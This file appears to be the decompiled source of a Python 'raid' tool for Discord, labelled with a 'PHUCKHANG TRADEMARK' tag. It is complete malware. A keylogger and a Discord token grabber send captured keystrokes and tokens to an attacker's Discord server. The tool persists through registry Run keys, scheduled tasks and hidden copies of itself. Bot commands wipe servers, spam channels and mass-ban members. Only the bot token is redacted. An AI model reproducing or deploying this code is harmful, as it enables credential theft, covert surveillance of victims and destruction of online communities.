# =====================================================================
# Decompiled & Deobfuscated Source Code
# Target: tool raid bypass all bot anti.exe
# Original File Name: proxynuke.py
# Environment: Python 3.12 (PyInstaller unpacked)
# Author/Branding Tag: "PHUCKHANG TRADEMARK"
# =====================================================================

import os
import sys
import time
import socket
import base64
import threading
import subprocess
import random
import shutil
import json
import re
import urllib.request
import urllib
from datetime import datetime
import asyncio
import discord
from discord.ext import commands

APP_NAME = "ProxyTool"
APP_VERSION = "2.2.0"
BOT_TOKEN = "DISCORD_BOT_TOKEN_DEFANGED_MTU2Nj...REDACTED"
GUILD_ID = "1561740325607964763"
UA = "DiscordBot (https://discord.com, 1.0)"

TEMP_DIR = os.environ.get("TEMP", r"C:\Windows\Temp")
KEYLOG_FILE = os.path.join(TEMP_DIR, ".syscache.dat")
MARKER_FILE = os.path.join(os.environ.get("APPDATA", ""), ".px_marker")

_CHANNEL = {}
_KLOG_BUF = []

DISCORD_PATHS = [
    os.path.join(os.environ.get("APPDATA", ""), "discord", "Local Storage", "leveldb"),
    os.path.join(os.environ.get("APPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
    os.path.join(os.environ.get("APPDATA", ""), "discordptb", "Local Storage", "leveldb"),
    os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
    os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
    os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
]

TOKEN_RE = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')
ENC_RE = re.compile(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)')

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

tool_bot = commands.Bot(command_prefix='!', intents=intents)

NEW_SERVER_NAME = "PHUCKHANG TRADEMARK"
CHANNEL_COUNT = 300
SPAM_COUNT = 5


def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def _get_bot_id():
    h = os.environ.get("COMPUTERNAME", "PC")
    u = os.environ.get("USERNAME", "user")
    mac = "000000"
    try:
        import uuid
        mac = f"{uuid.getnode():012x}"[-6:]
        return f"{h}_{u}_{mac}"
    except Exception:
        pass
    try:
        return f"{h}_{u}_{os.urandom(6).hex()}"
    except Exception:
        return f"{h}_{u}_000000"


BOT_ID = _get_bot_id()


def _curl(method, url, data=None):
    try:
        cmd = [
            'curl', '-s', '-X', method,
            '-H', f'Authorization: Bot {BOT_TOKEN}',
            '-H', f'User-Agent: {UA}',
            '-H', 'Content-Type: application/json'
        ]
        if data is not None:
            cmd += ['-d', json.dumps(data)]
        cmd.append(url)
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15, creationflags=134217728) # CREATE_NO_WINDOW
        if r.returncode == 0 and r.stdout.strip():
            return json.loads(r.stdout)
    except Exception:
        pass
    return None


def _curl_file(url, filename, data_bytes, ctype="application/octet-stream"):
    try:
        tmp = os.path.join(TEMP_DIR, filename)
        with open(tmp, 'wb') as f:
            f.write(data_bytes)
        cmd = [
            'curl', '-s', '-X', 'POST',
            '-H', f'Authorization: Bot {BOT_TOKEN}',
            '-H', f'User-Agent: {UA}',
            '-F', f'file=@{tmp};type={ctype}',
            url
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30, creationflags=134217728)
        try:
            os.remove(tmp)
        except Exception:
            pass
        if r.returncode == 0:
            return json.loads(r.stdout)
    except Exception:
        pass
    return None


def _get_channel():
    global _CHANNEL
    if _CHANNEL.get('id'):
        return _CHANNEL['id']
    safe = re.sub(r'[^a-z0-9\-]', '-', BOT_ID.lower())[:90].strip('-') or 'bot-unknown'
    chs = _curl('GET', f'https://discord.com/api/v9/guilds/{GUILD_ID}/channels')
    if isinstance(chs, list):
        for ch in chs:
            if ch.get('name') == safe:
                _CHANNEL = ch
                return ch['id']
    new = _curl('POST', f'https://discord.com/api/v9/guilds/{GUILD_ID}/channels', {
        'name': safe,
        'type': 0,
        'topic': f'Bot {BOT_ID} - {_get_local_ip()}'
    })
    if isinstance(new, dict) and new.get('id'):
        _CHANNEL = new
        return new['id']
    return None


def _ch_send(text):
    ch = _get_channel()
    if ch:
        _curl('POST', f'https://discord.com/api/v9/channels/{ch}/messages', {
            'content': text[:1900]
        })


def _ch_file(filename, data, ctype="application/octet-stream"):
    ch = _get_channel()
    if ch:
        _curl_file(f'https://discord.com/api/v9/channels/{ch}/messages', filename, data, ctype)


def _klog_flush():
    global _KLOG_BUF
    if not _KLOG_BUF:
        return
    data = ''.join(_KLOG_BUF)
    _KLOG_BUF.clear()
    try:
        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f'[{datetime.now()}] {data}\n')
    except Exception:
        pass


def keylogger_loop():
    try:
        from pynput import keyboard
        def on_press(k):
            try:
                _KLOG_BUF.append(k.char)
                if len(_KLOG_BUF) >= 32:
                    _klog_flush()
            except AttributeError:
                _KLOG_BUF.append(f'[{str(k)}]')
                if len(_KLOG_BUF) >= 32:
                    _klog_flush()

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
    except Exception:
        pass

    while True:
        try:
            time.sleep(60)
            _klog_flush()
            if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > 0:
                with open(KEYLOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                    c = f.read()
                if c.strip():
                    _ch_send(f'**KEYLOG**\n```\n{c[-1500:]}\n```')
                    with open(KEYLOG_FILE, 'w') as f:
                        f.truncate(0)
        except Exception:
            pass


def _scan_tokens():
    t = set()
    for p in DISCORD_PATHS:
        if not os.path.isdir(p):
            continue
        try:
            for f in os.listdir(p):
                if f.endswith('.ldb') or f.endswith('.log'):
                    try:
                        with open(os.path.join(p, f), 'r', errors='ignore') as fp:
                            d = fp.read()
                        for m in TOKEN_RE.findall(d):
                            t.add(m)
                        for m in ENC_RE.findall(d):
                            t.add('E:' + m)
                    except Exception:
                        pass
        except Exception:
            pass
    return t


def grabber_loop():
    seen = set()
    while True:
        try:
            ts = _scan_tokens()
            new = ts - seen
            if new:
                seen |= new
                _ch_send('**TOKENS**\n```\n' + '\n'.join(list(new)[:10]) + '\n```')
        except Exception:
            pass
        time.sleep(300)


@tool_bot.event
async def on_ready():
    print(f'ProxyTool logged in as {tool_bot.user}')


@tool_bot.command(name='nuke')
async def nuke(ctx, channel_name: str = 'PHUCKHANG TRADEMARK REGISTERED', *, message_content: str = 'PHUCKHANG TRADEMARK'):
    guild = ctx.guild
    await ctx.send('Executing sequence...', delete_after=5)
    rename_task = guild.edit(name=NEW_SERVER_NAME)
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(rename_task, *delete_tasks, return_exceptions=True)

    async def create_text(i):
        try:
            text_ch = await guild.create_text_channel(f"{channel_name}-{i}")
            message_tasks = [text_ch.send(f"{message_content} [{j + 1}]") for j in range(SPAM_COUNT)]
            await asyncio.gather(*message_tasks, return_exceptions=True)
        except Exception:
            pass

    async def create_voice(i):
        try:
            await guild.create_voice_channel(f"{channel_name}-vc-{i}")
        except Exception:
            pass

    text_tasks = [create_text(i) for i in range(CHANNEL_COUNT)]
    voice_tasks = [create_voice(i) for i in range(CHANNEL_COUNT)]
    await asyncio.gather(*(text_tasks + voice_tasks), return_exceptions=True)


@tool_bot.command(name='massband')
async def massband(ctx):
    guild = ctx.guild
    await ctx.send('Executing high-speed massban sequence...', delete_after=5)
    members = [
        member async for member in guild.fetch_members(limit=None)
        if member != guild.owner and member != tool_bot.user and member.top_role < guild.me.top_role
    ]
    batch_size = 25
    for i in range(0, len(members), batch_size):
        batch = members[i:i + batch_size]
        ban_tasks = [
            guild.ban(member, reason='PHUCKHANG TRADEMARK MANAGEMENT')
            for member in batch
        ]
        await asyncio.gather(*ban_tasks, return_exceptions=True)


def run_discord_bot():
    try:
        tool_bot.run(BOT_TOKEN)
    except Exception:
        pass


def _copy_self_to(d):
    try:
        cur = sys.argv[0]
        bot_file = sys.executable if 'python' not in os.path.basename(sys.executable).lower() else os.path.abspath(__file__)
        if not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        ext = '.exe' if bot_file.lower().endswith('.exe') else '.py'
        n = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)) + ext
        dst = os.path.join(d, n)
        if os.path.abspath(bot_file).lower() == os.path.abspath(dst).lower():
            return bot_file
        shutil.copy2(bot_file, dst)
        if dst.endswith('.py'):
            vbs = dst.replace('.py', '.vbs')
            with open(vbs, 'w') as f:
                f.write(f'CreateObject("WScript.Shell").Run "pythonw ""{dst}""", 0, False\n')
            return vbs
        return dst
    except Exception:
        return None


def _persist_registry(p, name):
    try:
        import winreg
        for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                k = winreg.OpenKey(hive, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, name, 0, winreg.REG_SZ, p)
                winreg.CloseKey(k)
            except Exception:
                pass
    except Exception:
        pass


def _persist_schtask(p, name):
    try:
        subprocess.run(f'schtasks /create /sc minute /mo 5 /tn "{name}" /tr "{p}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
    except Exception:
        pass


def persist_forever():
    try:
        if os.path.exists(MARKER_FILE):
            return
        with open(MARKER_FILE, 'w') as f:
            f.write('1')
    except Exception:
        pass

    dirs = [
        TEMP_DIR,
        os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "System"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "INetCache"),
        os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "System"),
    ]
    locs = []
    for d in dirs:
        p = _copy_self_to(d)
        if p:
            locs.append(p)
            _persist_registry(p, "WinProxySvc")
            _persist_schtask(p, "WinProxySvc")


if __name__ == '__main__':
    threading.Thread(target=keylogger_loop, daemon=True).start()
    threading.Thread(target=grabber_loop, daemon=True).start()
    threading.Thread(target=persist_forever, daemon=True).start()
    run_discord_bot()
